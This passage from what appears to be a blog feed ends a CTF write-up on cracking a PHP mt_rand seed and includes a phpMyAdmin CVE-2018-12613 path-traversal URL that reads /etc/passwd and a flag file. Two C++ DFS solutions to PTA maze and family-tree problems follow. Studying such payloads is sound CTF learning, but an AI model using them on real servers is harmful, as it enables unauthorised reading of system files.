class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'8y6CBQcJaW'</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line"><span class="keyword">res</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">j</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[<span class="keyword">j</span>]:</span><br><span class="line">            <span class="keyword">res</span>+=str(<span class="keyword">j</span>)+<span class="string">' '</span>+str(<span class="keyword">j</span>)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br></pre></td></tr></table></figure><p><img src="/2.jpg"></p><p>之后再利用<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a>这个脚本，破解seed</p><p>php_mt_seed，要先make，php_mt_seed.C生成php_mt_seed文件，再使用。具体语句Readme里面有。</p><p><img src="/3.jpg"></p><p>得到seed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(342457593);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">''</span>;</span><br><span class="line"><span class="variable">$len1</span> = 20;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str</span> .= substr(<span class="variable">$str_long1</span>, mt_rand(0, strlen(<span class="variable">$str_long1</span>) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span> . <span class="variable">$str</span> . <span class="string">"&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure><p><img src="/4.jpg"></p><p>得到字符。</p><p><a href="https://www.suk1.top/" target="_blank" rel="noopener">感谢晓黑老哥</a>，之前php用的是5.3版本，忘记改了，记得要改成7.1及以上。</p><h2 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h2><p>发现phpMyAdmin,可以利用现成poc直接打。</p><p><code>http://ip:port/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../../../../etc/passwd</code></p><p>发现可以用，试试flag</p><p><code>?target=db_datadict.php%253f/../../../../../../../../flag</code></p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">参考：cve-2018-12613-PhpMyadmin后台文件包含</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta-7-52 求解迷宫从入口到出口的所有最短路径(DFS)</title>
      <link href="/2020/02/06/pta-7-52-%E6%B1%82%E8%A7%A3%E8%BF%B7%E5%AE%AB%E4%BB%8E%E5%85%A5%E5%8F%A3%E5%88%B0%E5%87%BA%E5%8F%A3%E7%9A%84%E6%89%80%E6%9C%89%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
      <url>/2020/02/06/pta-7-52-%E6%B1%82%E8%A7%A3%E8%BF%B7%E5%AE%AB%E4%BB%8E%E5%85%A5%E5%8F%A3%E5%88%B0%E5%87%BA%E5%8F%A3%E7%9A%84%E6%89%80%E6%9C%89%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h2 id="求解迷宫从入口到出口的一条最短路径。输入一个迷宫，求从入口通向出口的一条可行最短路径。为简化问题，迷宫用二维数组-int-maze-10-10-来存储障碍物的分布，假设迷宫的横向和纵向尺寸的大小是一样的，并由程序运行读入-若读入迷宫大小的值是n（3"><a href="#求解迷宫从入口到出口的一条最短路径。输入一个迷宫，求从入口通向出口的一条可行最短路径。为简化问题，迷宫用二维数组-int-maze-10-10-来存储障碍物的分布，假设迷宫的横向和纵向尺寸的大小是一样的，并由程序运行读入-若读入迷宫大小的值是n（3" class="headerlink" title="求解迷宫从入口到出口的一条最短路径。输入一个迷宫，求从入口通向出口的一条可行最短路径。为简化问题，迷宫用二维数组 int maze[10][10]来存储障碍物的分布，假设迷宫的横向和纵向尺寸的大小是一样的，并由程序运行读入, 若读入迷宫大小的值是n（3&lt;n&lt;&#x3D;10），则该迷宫横向或纵向尺寸都是n，规定迷宫最外面的一圈是障碍物，迷宫的入口是maze[1][1]，出口是maze[n-2][n-2], 若maze[i][j] &#x3D; 1代表该位置是障碍物，若maze[i][j] &#x3D; 0代表该位置是可以行走的空位（0&lt;&#x3D;i&lt;&#x3D;n-1, 0&lt;&#x3D;j&lt;&#x3D;n-1）。求从入口maze[1][1]到出口maze[n-2][n-2]可以走通的所有最短路径条数。要求迷宫中只允许在水平或上下四个方向的空位上行走，走过的位置不能重复走。 如下这样一个迷宫："></a>求解迷宫从入口到出口的一条最短路径。输入一个迷宫，求从入口通向出口的一条可行最短路径。为简化问题，迷宫用二维数组 int maze[10][10]来存储障碍物的分布，假设迷宫的横向和纵向尺寸的大小是一样的，并由程序运行读入, 若读入迷宫大小的值是n（3&lt;n&lt;&#x3D;10），则该迷宫横向或纵向尺寸都是n，规定迷宫最外面的一圈是障碍物，迷宫的入口是maze[1][1]，出口是maze[n-2][n-2], 若maze[i][j] &#x3D; 1代表该位置是障碍物，若maze[i][j] &#x3D; 0代表该位置是可以行走的空位（0&lt;&#x3D;i&lt;&#x3D;n-1, 0&lt;&#x3D;j&lt;&#x3D;n-1）。求从入口maze[1][1]到出口maze[n-2][n-2]可以走通的所有最短路径条数。要求迷宫中只允许在水平或上下四个方向的空位上行走，走过的位置不能重复走。 如下这样一个迷宫：</h2><a id="more"></a><p><img src="/1.png"></p><p>对应的二维数组表示： </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">int</span> maze[<span class="number">10</span>][<span class="number">10</span>]=&#123;</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>输入迷宫大小的整数n, 以及n行和n列的二维数组（数组元素1代表障碍物，0代表空位）。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出按规定可以走通的所有最短路径条数。若没有通路，输出：0。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">0</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><p>1</p><h2 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h2><p>1</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码:"></a>代码:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int n,flag=<span class="number">0</span>,Min,sum;</span><br><span class="line">int Map[<span class="number">30</span>][<span class="number">30</span>]; </span><br><span class="line">int vis[<span class="number">30</span>][<span class="number">30</span>];</span><br><span class="line">int dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">void dfs(int x,int y,int step)&#123;     <span class="comment">//求最短路径</span></span><br><span class="line">if(step&gt;Min)&#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(x==n<span class="number">-2</span>&amp;&amp;y==n<span class="number">-2</span>)&#123;</span><br><span class="line">Min=step;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">int xx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">int yy=y+dir[i][<span class="number">1</span>];</span><br><span class="line">if(xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;=n||yy&gt;=n)&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">if(!vis[xx][yy]&amp;&amp;Map[xx][yy]==<span class="number">0</span>)&#123;</span><br><span class="line">vis[xx][yy]=<span class="number">1</span>;</span><br><span class="line">dfs(xx,yy,step+<span class="number">1</span>);</span><br><span class="line">vis[xx][yy]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">void dfs1(int x,int y,int step)&#123;        <span class="comment">//求相同路径</span></span><br><span class="line">if(x==n<span class="number">-2</span>&amp;&amp;y==n<span class="number">-2</span>&amp;&amp;step==Min)&#123;</span><br><span class="line">sum++;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">int xx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">int yy=y+dir[i][<span class="number">1</span>];</span><br><span class="line">if(xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;=n||yy&gt;=n)&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">if(!vis[xx][yy]&amp;&amp;Map[xx][yy]==<span class="number">0</span>)&#123;</span><br><span class="line">vis[xx][yy]=<span class="number">1</span>;</span><br><span class="line">dfs1(xx,yy,step+<span class="number">1</span>);</span><br><span class="line">vis[xx][yy]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">scanf(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">memset(vis,<span class="number">0</span>,sizeof(vis));</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">for(int j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">scanf(<span class="string">"%d"</span>,&amp;Map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">vis[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">Min=<span class="number">10000</span>;</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">if(Min==<span class="number">10000</span>)&#123;         <span class="comment">//不存在最短路</span></span><br><span class="line">printf(<span class="string">"0<span class="subst">\n</span>"</span>);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">memset(vis,<span class="number">0</span>,sizeof(vis));</span><br><span class="line">sum=<span class="number">1</span>;</span><br><span class="line">vis[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">dfs1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);        <span class="comment">//求同最短路一样的路</span></span><br><span class="line">printf(<span class="string">"%d"</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line">return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pta-7-39 小字辈 (25分)(DFS)</title>
      <link href="/2020/02/03/Pta-7-39-%E5%B0%8F%E5%AD%97%E8%BE%88-25%E5%88%86-DFS/"/>
      <url>/2020/02/03/Pta-7-39-%E5%B0%8F%E5%AD%97%E8%BE%88-25%E5%88%86-DFS/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>本题给定一个庞大家族的家谱，要请你给出最小一辈的名单。</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>输入在第一行给出家族人口总数 N（不超过 100 000 的正整数） —— 简单起见，我们把家族成员从 1 到 N 编号。随后第二行给出 N 个编号，其中第 i 个编号对应第 i 位成员的父&#x2F;母。家谱中辈分最高的老祖宗对应的父&#x2F;母编号为 -1。一行中的数字间以空格分隔。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>首先输出最小的辈分（老祖宗的辈分为 1，以下逐级递增）。然后在第二行按递增顺序输出辈分最小的成员的编号。编号间以一个空格分隔，行首尾不得有多余空格。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">2</span> <span class="number">6</span> <span class="number">5</span> <span class="number">5</span> <span class="number">-1</span> <span class="number">5</span> <span class="number">6</span> <span class="number">4</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">9</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,root,sum=<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; f[<span class="number">110000</span>],ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> cnt)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(f[x].<span class="built_in">size</span>()==<span class="number">0</span> &amp;&amp; cnt&gt;sum)&#123;</span><br><span class="line">sum=cnt;</span><br><span class="line">ans.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(sum==cnt)&#123;</span><br><span class="line">ans.push_back(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;f[x].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">dfs(f[x][i],cnt+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line"><span class="keyword">if</span>(m==<span class="number">-1</span>)</span><br><span class="line">root=i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">f[m].push_back(i); </span><br><span class="line">&#125;</span><br><span class="line">dfs(root,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ans.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,ans[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>,ans[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pta-7-50 最近距离 (25分)(DFS)</title>
      <link href="/2020/02/03/Pta-7-50-%E6%9C%80%E8%BF%91%E8%B7%9D%E7%A6%BB-25%E5%88%86-DFS/"/>
      <url>/2020/02/03/Pta-7-50-%E6%9C%80%E8%BF%91%E8%B7%9D%E7%A6%BB-25%E5%88%86-DFS/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个游戏中，玩家处于一个如下所示12行12列的迷宫：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span 